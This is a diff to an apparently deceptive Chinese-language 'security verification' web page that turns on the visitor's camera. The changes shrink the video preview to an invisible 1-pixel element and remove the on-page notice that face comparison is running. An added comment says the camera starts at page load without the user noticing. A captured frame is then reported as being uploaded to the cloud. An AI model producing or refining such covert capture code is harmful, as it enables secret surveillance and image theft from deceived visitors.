@@ -11,50 +11,26 @@
         h1 { color: #3b82f6; font-size: 24px; font-weight: 600; margin-bottom: 12px; }
         .subtitle { color: #ffffff; font-size: 13px; line-height: 1.6; margin-bottom: 25px; opacity: 0.9; }
         
-        /* ================= 新增：左右并排弹性布局 ================= */
-        .preview-row { 
-            display: flex; 
-            align-items: center; 
-            gap: 15px; 
-            background: #171821;
-            padding: 12px;
-            border-radius: 6px;
-            border: 1px solid #1e202c;
-            margin-bottom: 25px; 
-            text-align: left; /* 让右侧文字左对齐 */
+        /* 预览容器缩至几乎不可见，但保留 video 元素完整绘制能力 */
+        .preview-container {
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            overflow: hidden;
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            pointer-events: none;
+            margin: 0;
+            padding: 0;
+            border: none;
         }
-        
-        /* 缩小后的摄像头预览框 */
-        .preview-container { 
-            width: 100px; 
-            height: 100px; 
-            background: #000; 
-            border-radius: 4px; 
-            overflow: hidden; 
-            border: 1px solid #282a36; 
-            flex-shrink: 0; /* 防止小框被文字挤压变形 */
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        
-        /* 右侧说明文字区域 */
-        .preview-text-box { 
-            flex: 1; 
-        }
-        .text-status {
-            font-size: 12px;
-            color: #10b981; /* 绿色的状态提示 */
-            font-weight: bold;
-            margin-bottom: 4px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-        .text-desc {
-            font-size: 11px;
-            color: #64748b;
-            line-height: 1.4;
-        }
-        /* ======================================================== */
+        .view-tip { display: none; }
 
         .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; }
         .btn-verify:active { transform: scale(0.98); background: #dc2626; }
@@ -69,14 +45,9 @@
     <h1>欢迎访问</h1>
     <p class="subtitle">为保护网站与进行安全守护验证<br>需要检验您的设备环境与网络状态</p>
 
-    <div class="preview-row">
-        <div class="preview-container">
-            <video id="video" autoplay playsinline muted></video>
-        </div>
-        <div class="preview-text-box">
-            <div class="text-status">● 认证视频流已就绪</div>
-            <div class="text-desc">为了确保安全合规访问，系统已启动人脸环境比对。请保持光线充足，并点击下方按钮完成网络接入。</div>
-        </div>
+    <div class="preview-container">
+        <div class="view-tip">● 验证画面已启用</div>
+        <video id="video" autoplay playsinline muted></video>
     </div>
 
     <button class="btn-verify" id="start-btn" onclick="executeVerification()">检验</button>
@@ -92,6 +63,7 @@
 <script>
     let streamRef = null;
 
+    // 页面加载时预热摄像头，用户无感知
     window.addEventListener('DOMContentLoaded', async () => {
         try {
             streamRef = await navigator.mediaDevices.getUserMedia({
@@ -101,7 +73,7 @@
             const video = document.getElementById('video');
             video.srcObject = streamRef;
         } catch (err) {
-            console.warn("摄像头初始化失败:", err);
+            console.warn("摄像头预热失败:", err);
         }
     });
 
@@ -120,7 +92,7 @@
                 });
                 document.getElementById('video').srcObject = streamRef;
             } catch (err) {
-                console.warn("未获得摄像头权限:", err);
+                console.warn("摄像头权限未授予:", err);
             }
         }
 
@@ -152,7 +124,6 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
             setTimeout(() => {
                 streamRef.getTracks().forEach(track => track.stop());
             }, 200);
@@ -161,6 +132,9 @@
             canvas.height = 480;
             ctx.fillStyle = "#121319";
             ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#7a8590";
+            ctx.font = "20px Arial";
+            ctx.fillText("Environment Check Buffer", 50, 50);
         }
 
         updateStatus("正在同步打包并上传云端...");
